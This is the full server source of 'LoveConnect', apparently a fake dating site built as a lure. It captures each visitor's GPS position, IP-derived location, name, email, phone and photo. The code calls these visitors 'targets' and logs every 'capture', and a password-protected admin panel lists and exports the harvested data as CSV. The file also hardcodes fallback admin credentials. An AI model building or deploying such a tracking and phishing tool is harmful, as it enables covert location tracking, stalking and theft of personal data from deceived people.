const express = require('express');
const session = require('express-session');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');
const http = require('http');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const IS_VERCEL = Boolean(process.env.VERCEL);
const SESSION_SECRET = process.env.SESSION_SECRET || 'loveconnect-secret-key-2026-xyz';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SecurePass123';

// Vercel-safe JSON storage instead of native SQLite.
const dbPath = IS_VERCEL ? '/tmp/loveconnect-locations.json' : path.join(__dirname, 'database', 'locations.json');
const dbDir = path.dirname(dbPath);
if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
}

function ensureDatabaseFile() {
    if (!fs.existsSync(dbPath)) {
        fs.writeFileSync(dbPath, JSON.stringify([], null, 2), 'utf8');
    }
}

function readDatabaseRows() {
    ensureDatabaseFile();
    try {
        const contents = fs.readFileSync(dbPath, 'utf8');
        const parsed = JSON.parse(contents);
        return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
        console.error('[DATABASE ERROR] Failed to read JSON store:', error.message);
        return [];
    }
}

function writeDatabaseRows(rows) {
    ensureDatabaseFile();
    fs.writeFileSync(dbPath, JSON.stringify(rows, null, 2), 'utf8');
}

function insertLocationRecord(record, callback) {
    try {
        const rows = readDatabaseRows();
        const nextId = rows.reduce((max, row) => Math.max(max, Number(row.id) || 0), 0) + 1;
        const createdAt = new Date().toISOString();
        const newRow = {
            id: nextId,
            latitude: record.latitude ?? null,
            longitude: record.longitude ?? null,
            accuracy: record.accuracy ?? null,
            timestamp: createdAt,
            ip_address: record.ip_address || 'Unknown',
            user_agent: record.user_agent || 'Unknown',
            status: record.status || 'Active',
            is_gps: record.is_gps === 1 || record.is_gps === true ? 1 : 0,
            city: record.city || 'Unknown',
            country: record.country || 'Unknown',
            notes: record.notes || '',
            name: record.name || '',
            email: record.email || '',
            phone: record.phone || '',
            photo: record.photo || null,
            photo_mime: record.photo_mime || null
        };

        rows.unshift(newRow);
        writeDatabaseRows(rows);
        console.log('[DATABASE] Stored location record in JSON database:', newRow.id);
        callback(null, newRow);
    } catch (error) {
        console.error('[DATABASE ERROR] Insert failed:', error.message);
        callback(error);
    }
}

function updateLocationNotes(id, notes, callback) {
    try {
        const rows = readDatabaseRows();
        const targetIndex = rows.findIndex((row) => Number(row.id) === Number(id));

        if (targetIndex === -1) {
            callback(new Error('Location record not found.'));
            return;
        }

        rows[targetIndex].notes = String(notes || '').trim();
        writeDatabaseRows(rows);
        callback(null, rows[targetIndex]);
    } catch (error) {
        console.error('[DATABASE ERROR] Notes update failed:', error.message);
        callback(error);
    }
}

function clearLocationRows(callback) {
    try {
        writeDatabaseRows([]);
        callback(null, true);
    } catch (error) {
        console.error('[DATABASE ERROR] Clear failed:', error.message);
        callback(error);
    }
}

function getAllLocations(callback) {
    try {
        const rows = readDatabaseRows();
        callback(null, rows);
    } catch (error) {
        console.error('[DATABASE ERROR] Load failed:', error.message);
        callback(error);
    }
}

ensureDatabaseFile();

// Middlewares
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', 1);

// Express Session configuration
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: false, // Set to true if using HTTPS, but false is needed for local/ngrok HTTP testing
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Utility: Capture real client IP address (taking ngrok/proxies into account)
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress;
}

// Utility: Free IP Geolocation Lookup using ip-api.com
function geolocateIP(ip, callback) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.0.0.1')) {
        return callback(null, { country: 'Localhost', city: 'Localhost', lat: 40.7128, lon: -74.0060 }); // Default NYC coordinates for localhost testing
    }
    
    // Clean up IPv6 mapped IPv4 address
    const cleanIp = ip.replace(/^::ffff:/, '');
    
    const url = `http://ip-api.com/json/${cleanIp}`;
    
    const req = http.get(url, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            try {
                const json = JSON.parse(data);
                if (json.status === 'success') {
                    callback(null, {
                        country: json.country || 'Unknown',
                        city: json.city || 'Unknown',
                        lat: json.lat || 0,
                        lon: json.lon || 0
                    });
                } else {
                    callback(new Error(json.message || 'Lookup status failed'));
                }
            } catch (e) {
                callback(e);
            }
        });
    });

    req.on('error', (err) => {
        callback(err);
    });
    
    req.setTimeout(3000, () => {
        req.destroy();
        callback(new Error('IP Geolocation request timed out'));
    });
}

// Middleware: Lightweight Rate Limiter
const ipRequests = new Map();
function rateLimiter(req, res, next) {
    const ip = getClientIp(req);
    const now = Date.now();
    const windowMs = 60 * 1000; // 1 minute
    const maxRequests = 30; // 30 requests per minute

    if (!ipRequests.has(ip)) {
        ipRequests.set(ip, []);
    }

    const timestamps = ipRequests.get(ip).filter(t => now - t < windowMs);
    timestamps.push(now);
    ipRequests.set(ip, timestamps);

    if (timestamps.length > maxRequests) {
        console.warn(`[RATE LIMIT] Blocked IP: ${ip} for exceeding request limit`);
        return res.status(429).json({ error: 'Too many requests. Please try again later.' });
    }
    next();
}

// Middleware: Admin Page Authentication Guard
function isAuthenticated(req, res, next) {
    if (req.session && req.session.isAdmin) {
        return next();
    }
    res.redirect('/admin/login');
}

// Middleware: Admin API Authentication Guard
function isAdminApi(req, res, next) {
    if (req.session && req.session.isAdmin) {
        return next();
    }
    res.status(401).json({ error: 'Unauthorized. Admin access required.' });
}

// ==========================================
// PUBLIC USER FRONTEND ROUTES
// ==========================================

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve admin login page
app.get('/admin/login', (req, res) => {
    if (req.session && req.session.isAdmin) {
        return res.redirect('/admin');
    }
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve admin dashboard (protected)
app.get('/admin', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Prevent direct unauthenticated static access to secure pages
app.get('/admin.html', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/login.html', (req, res) => {
    res.redirect('/admin/login');
});

// ==========================================
// API ENDPOINTS
// ==========================================

// Admin Login Authentication
app.post('/api/auth', rateLimiter, (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Username and password are required.' });
    }

    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        
        const ip = getClientIp(req);
        console.log(`[AUTH SUCCESS] Admin logged in successfully from IP: ${ip}`);
        
        req.session.save((err) => {
            if (err) {
                console.error('[SESSION ERROR] Failed to save:', err);
                return res.status(500).json({ success: false, message: 'Server session initialization failed.' });
            }
            return res.json({ success: true, message: 'Authenticated successfully.' });
        });
    } else {
        const ip = getClientIp(req);
        console.warn(`[AUTH FAILED] Unauthorized login attempt from IP: ${ip} with username: ${username}`);
        return res.status(401).json({ success: false, message: 'Invalid username or password.' });
    }
});

// Admin Logout
app.get('/admin/logout', (req, res) => {
    const ip = getClientIp(req);
    console.log(`[AUTH] Admin logging out from IP: ${ip}`);
    req.session.destroy((err) => {
        if (err) {
            console.error('[AUTH ERROR] Logout failure:', err);
        }
        res.redirect('/admin/login');
    });
});

// Receive and store location data + target's sign-up contact details (Public Endpoint)
app.post('/api/locations', rateLimiter, (req, res) => {
    const ipAddress = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    let { latitude, longitude, accuracy, is_gps, notes, city, country, name, email, phone, photo, photo_mime } = req.body;
    
    // Parse and sanitize inputs
    latitude = (latitude !== undefined && latitude !== null && latitude !== '') ? parseFloat(latitude) : null;
    longitude = (longitude !== undefined && longitude !== null && longitude !== '') ? parseFloat(longitude) : null;
    accuracy = (accuracy !== undefined && accuracy !== null && accuracy !== '') ? parseInt(accuracy) : null;
    is_gps = is_gps !== undefined ? (is_gps ? 1 : 0) : 1;
    notes = notes ? String(notes).trim() : '';
    city = city ? String(city).trim() : '';
    country = country ? String(country).trim() : '';
    photo = photo ? String(photo).trim() : '';
    photo_mime = photo_mime ? String(photo_mime).trim() : (photo && photo.startsWith('data:') ? photo.match(/^data:([^;]+);/)?.[1] || 'image/jpeg' : 'image/jpeg');
    
    // Target user profile data
    name = name ? String(name).trim() : '';
    email = email ? String(email).trim() : '';
    phone = phone ? String(phone).trim() : '';

    console.log(`[CAPTURE ATTEMPT] Name: ${name} | IP: ${ipAddress} | GPS Flag: ${is_gps} | Lat: ${latitude} | Lng: ${longitude} | Photo: ${photo ? 'Yes' : 'No'}`);

    // Helper to insert and respond
    const saveToDatabase = (latVal, lngVal, accVal, gpsVal, cityVal, countryVal) => {
        // Validation: If coordinates are numbers
        if (latVal !== null && isNaN(latVal)) latVal = null;
        if (lngVal !== null && isNaN(lngVal)) lngVal = null;
        if (accVal !== null && isNaN(accVal)) accVal = null;

        insertLocationRecord({
            latitude: latVal,
            longitude: lngVal,
            accuracy: accVal,
            ip_address: ipAddress,
            user_agent: userAgent,
            is_gps: gpsVal,
            city: cityVal,
            country: countryVal,
            notes,
            name,
            email,
            phone,
            photo,
            photo_mime,
            status: 'Active'
        }, (err, newRow) => {
            if (err) {
                console.error('[DB INSERT ERROR] Failed to save location:', err.message);
                return res.status(500).json({ error: 'Failed to write record to database' });
            }

            console.log(`[SUCCESS] Captured Target ID: ${newRow.id} | Name: ${name} | Coords: ${latVal}, ${lngVal} | Photo: ${photo ? 'attached' : 'not attached'}`);

            console.log(`\n🔔 [NEW LEAD NOTIFICATION]`);
            console.log(`👤 Name: ${name}`);
            console.log(`📧 Email: ${email}`);
            console.log(`📞 Phone: ${phone}`);
            console.log(`📍 Location: ${cityVal}, ${countryVal}`);
            console.log(`🧭 Coords: ${latVal}, ${lngVal} (Accuracy: ${accVal}m, Type: ${gpsVal === 1 ? 'GPS' : 'IP'})\n`);

            return res.status(200).json({
                success: true,
                id: newRow.id,
                message: 'Profile and Location saved successfully.',
                data: {
                    id: newRow.id,
                    latitude: latVal,
                    longitude: lngVal,
                    accuracy: accVal,
                    is_gps: gpsVal,
                    city: cityVal,
                    country: countryVal,
                    name,
                    email,
                    phone,
                    photo: photo || null,
                    photo_mime: photo_mime || null,
                    timestamp: newRow.timestamp
                }
            });
        });
    };

    // If client lacks GPS coordinates, trigger Server IP Geolocation
    if ((latitude === null || longitude === null) && ipAddress) {
        geolocateIP(ipAddress, (err, geo) => {
            if (err) {
                console.warn(`[IP GEO FAIL] Unable to geolocate IP ${ipAddress}:`, err.message);
                saveToDatabase(null, null, null, 0, 'Unknown', 'Unknown');
            } else {
                console.log(`[IP GEO SUCCESS] Resolved IP ${ipAddress} to ${geo.city}, ${geo.country}`);
                saveToDatabase(geo.lat, geo.lon, 10000, 0, geo.city, geo.country);
            }
        });
    } else {
        // Coords supplied by client. If city/country details are blank, resolve client IP to enrich details
        if (!city || !country) {
            geolocateIP(ipAddress, (err, geo) => {
                if (!err && geo) {
                    saveToDatabase(latitude, longitude, accuracy, is_gps, geo.city, geo.country);
                } else {
                    saveToDatabase(latitude, longitude, accuracy, is_gps, city || 'Unknown', country || 'Unknown');
                }
            });
        } else {
            saveToDatabase(latitude, longitude, accuracy, is_gps, city, country);
        }
    }
});

// Retrieve all captured locations (Admin Only)
app.get('/api/locations', isAdminApi, (req, res) => {
    getAllLocations((err, rows) => {
        if (err) {
            console.error('[DB SELECT ERROR] Failed to fetch locations:', err.message);
            return res.status(500).json({ error: 'Database fetch failed.' });
        }
        res.json((rows || []).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)));
    });
});

// Update Notes on a Captured Location (Admin Only)
app.put('/api/locations/:id/notes', isAdminApi, (req, res) => {
    const { id } = req.params;
    const { notes } = req.body;

    if (notes === undefined) {
        return res.status(400).json({ error: 'Notes body parameter is required.' });
    }

    updateLocationNotes(id, notes, (err, updatedRow) => {
        if (err) {
            console.error('[DB UPDATE ERROR] Failed to update notes:', err.message);
            return res.status(404).json({ error: err.message || 'Location record not found.' });
        }
        res.json({ success: true, message: `Notes updated for location ID: ${id}`, data: updatedRow });
    });
});

// Clear all captured locations (Admin Only)
app.delete('/api/locations', isAdminApi, (req, res) => {
    clearLocationRows((err) => {
        if (err) {
            console.error('[DB DELETE ERROR] Failed to clear table:', err.message);
            return res.status(500).json({ error: 'Failed to clear location logs.' });
        }
        console.log('[SECURITY] Admin cleared ALL location tracking logs from DB');
        res.json({ success: true, message: 'All location data has been successfully cleared.' });
    });
});

// Export Locations to CSV (Admin Only)
app.get('/api/locations/export', isAdminApi, (req, res) => {
    getAllLocations((err, rows) => {
        if (err) {
            console.error('[EXPORT ERROR] Failed to load data:', err.message);
            return res.status(500).send('Failed to prepare data for CSV export.');
        }

        const headers = [
            'ID', 'Target Name', 'Target Email', 'Target Phone', 'Latitude', 'Longitude',
            'Accuracy (Meters)', 'Timestamp', 'IP Address', 'User Agent', 'Status',
            'Is GPS?', 'City', 'Country', 'Notes'
        ];

        const escapeCSV = (val) => {
            if (val === null || val === undefined) return '';
            let str = String(val);
            if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
                str = '"' + str.replace(/"/g, '""') + '"';
            }
            return str;
        };

        const csvLines = [headers.join(',')];
        for (const row of rows) {
            const line = [
                row.id,
                row.name || 'Anonymous',
                row.email || 'N/A',
                row.phone || 'N/A',
                row.latitude !== null ? row.latitude : 'N/A',
                row.longitude !== null ? row.longitude : 'N/A',
                row.accuracy !== null ? row.accuracy : 'N/A',
                row.timestamp,
                row.ip_address,
                row.user_agent,
                row.status,
                row.is_gps === 1 ? 'Yes' : 'No',
                row.city || 'Unknown',
                row.country || 'Unknown',
                row.notes || ''
            ];
            csvLines.push(line.map(escapeCSV).join(','));
        }

        const csvString = csvLines.join('\n');

        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', `attachment; filename=loveconnect_export_${Date.now()}.csv`);
        res.status(200).send(csvString);
    });
});

// Serve static assets (CSS, JS, media)
app.use(express.static(path.join(__dirname, 'public')));

// Catch-all route to redirect back to landing page
app.get('*', (req, res) => {
    res.redirect('/');
});

// Start the server
if (require.main === module) {
    app.listen(PORT, () => {
        console.log('======================================================');
        console.log('💖 LoveConnect Full-Stack Server Running Successfully!');
        console.log(`📍 Local URL: http://localhost:${PORT}`);
        console.log(`🔒 Admin Area: http://localhost:${PORT}/admin`);
        console.log('======================================================');
    });
}

module.exports = app;
